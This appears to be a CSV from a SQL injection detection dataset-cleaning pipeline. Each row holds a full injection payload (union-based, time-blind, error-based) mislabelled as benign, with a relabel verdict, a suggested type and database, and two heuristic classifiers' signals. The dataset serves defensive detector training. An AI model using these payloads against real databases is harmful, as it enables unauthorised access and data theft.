payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
1'|| ( select 'xglm' from dual where 3556 = 3556 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,oracle,1'|| ( select 'xglm' from dual where 3556 = 3556 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,False,0,time_blind,oracle,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
"1"" ) ) and sleep ( 5 ) and ( ( ""timv"" = ""timv",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"1"" ) ) and sleep ( 5 ) and ( ( ""timv"" = ""timv",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"-7544"" ) ) union all select 3808,3808,3808,3808--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-7544"" ) ) union all select 3808,3808,3808,3808--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-7032' ) as xmmm where 5635 = 5635 union all select 5635,5635,5635,5635,5635--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-7032' ) as xmmm where 5635 = 5635 union all select 5635,5635,5635,5635,5635--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
waitfor delay '0:0:5' and ( ( ( 'hrta' = 'hrta,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'waitfor' (likely false negative),time_blind,mssql,waitfor delay '0:0:5' and ( ( ( 'hrta' = 'hrta,False,0,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected
"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and 'lgat' like 'lgat",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'extractvalue' (likely false negative),boolean_blind,mysql,"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and 'lgat' like 'lgat",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,postgresql,"1"" ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",False,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal
"-9389' where 5713 = 5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-9389' where 5713 = 5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ""ponv"" = ""ponv",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,mysql,"1"" ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ""ponv"" = ""ponv",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1 union all select null,null,null,null,null,null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1 union all select null,null,null,null,null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) union all select null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1"" ) union all select null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' ) union all select null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1' ) union all select null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
-2733' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'btjx' = 'btjx,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'xmltype' (likely false negative),error_based,oracle,-2733' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'btjx' = 'btjx,False,0,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'dbms_pipe' (likely false negative),time_blind,oracle,"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
1' ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,1' ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1 union all select null,null,null,null,null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1 union all select null,null,null,null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1'+ ( select lang where 4191 = 4191 union all select null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1'+ ( select lang where 4191 = 4191 union all select null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1%' ) ) union all select null--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,1%' ) ) union all select null--,False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' ) ) as nuku where 7009 = 7009 union all select null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1' ) ) as nuku where 7009 = 7009 union all select null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1 ) ) union all select null,null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1 ) ) union all select null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1 ) where 2020 = 2020 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),time_blind,mysql,"1 ) where 2020 = 2020 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'dbms_pipe' (likely false negative),time_blind,oracle,"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
"1 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),time_blind,mysql,"1 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1%' ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),boolean_blind,mysql,"1%' ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"-1015"" ) ) union all select 6624,6624#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-1015"" ) ) union all select 6624,6624#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""iuxs"" like ""iuxs",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),time_blind,mysql,"1"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""iuxs"" like ""iuxs",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'jfwt' like 'jfwt",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),time_blind,mysql,"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'jfwt' like 'jfwt",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-1487"" ) as crfi where 2407 = 2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-1487"" ) as crfi where 2407 = 2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ""umst"" = ""umst",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'updatexml' (likely false negative),boolean_blind,mysql,"1"" ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ""umst"" = ""umst",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" ) ) union all select null,null,null,null,null,null,null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1"" ) ) union all select null,null,null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-5691' union all select 6610,6610#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-5691' union all select 6610,6610#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1'|| ( select 'ybfo' from dual where 3319 = 3319 union all select null,null,null,null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,oracle,"1'|| ( select 'ybfo' from dual where 3319 = 3319 union all select null,null,null,null,null,null,null,null#",False,0,union_based,oracle,Pattern match: 'union all select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure
"-3442' in boolean mode ) union all select 6255,6255,6255,6255,6255#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-3442' in boolean mode ) union all select 6255,6255,6255,6255,6255#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' where 6721 = 6721 union all select null,null,null,null,null,null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1' where 6721 = 6721 union all select null,null,null,null,null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1 ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,mysql,"1 ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-2849' union all select 6491,6491,6491,6491,6491,6491,6491--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-2849' union all select 6491,6491,6491,6491,6491,6491,6491--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1%"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""%"" = """,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"1%"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""%"" = """,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
1' where 5455 = 5455 and sleep ( 5 ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,1' where 5455 = 5455 and sleep ( 5 ) --,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"-2007%' ) ) union all select 7298,7298,7298#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-2007%' ) ) union all select 7298,7298,7298#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' ) ) as sxpk where 5524 = 5524 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,mysql,"1' ) ) as sxpk where 5524 = 5524 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"select sleep ( 5 ) and ""jvys"" like ""jvys",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"select sleep ( 5 ) and ""jvys"" like ""jvys",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"-6086"" union all select 8700,8700,8700,8700--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-6086"" union all select 8700,8700,8700,8700--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1 where 2292 = 2292 union all select null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1 where 2292 = 2292 union all select null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1 ) ) as skex where 7941 = 7941 and sleep ( 5 ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,1 ) ) as skex where 7941 = 7941 and sleep ( 5 ) --,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1"" or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"1"" or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
1 ) as uhmm where 2304 = 2304 union all select null#,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,1 ) as uhmm where 2304 = 2304 union all select null#,False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-1150' ) as hdby where 4032 = 4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-1150' ) as hdby where 4032 = 4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1 ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( 8024 = 8024",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),boolean_blind,mysql,"1 ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( 8024 = 8024",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"select pg_sleep ( 5 ) and ( ( ( ""wqeb"" = ""wqeb",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,postgresql,"select pg_sleep ( 5 ) and ( ( ( ""wqeb"" = ""wqeb",False,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal
"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),boolean_blind,mysql,"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo )",False,0,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
"1"" and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"1"" and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1 ) as zhvx where 3171 = 3171 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'extractvalue' (likely false negative),error_based,mysql,"1 ) as zhvx where 3171 = 3171 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",False,0,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
1' ) waitfor delay '0:0:5',benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'waitfor' (likely false negative),time_blind,mssql,1' ) waitfor delay '0:0:5',False,0,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected
"1%"" ) ) union all select null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1%"" ) ) union all select null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" where 9632 = 9632 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,mysql,"1"" where 9632 = 9632 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-2384%' ) ) union all select 2467,2467,2467,2467#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-2384%' ) ) union all select 2467,2467,2467,2467#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) ) union all select null,null,null,null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1"" ) ) union all select null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1'+ ( select 'gmpn' where 8137 = 8137 or sleep ( 5 ) ) +',benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,1'+ ( select 'gmpn' where 8137 = 8137 or sleep ( 5 ) ) +',False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""qcqx"" like ""qcqx",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""qcqx"" like ""qcqx",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
"-5657' ) ) ) union all select 8071,8071,8071,8071,8071,8071,8071,8071#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-5657' ) ) ) union all select 8071,8071,8071,8071,8071,8071,8071,8071#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
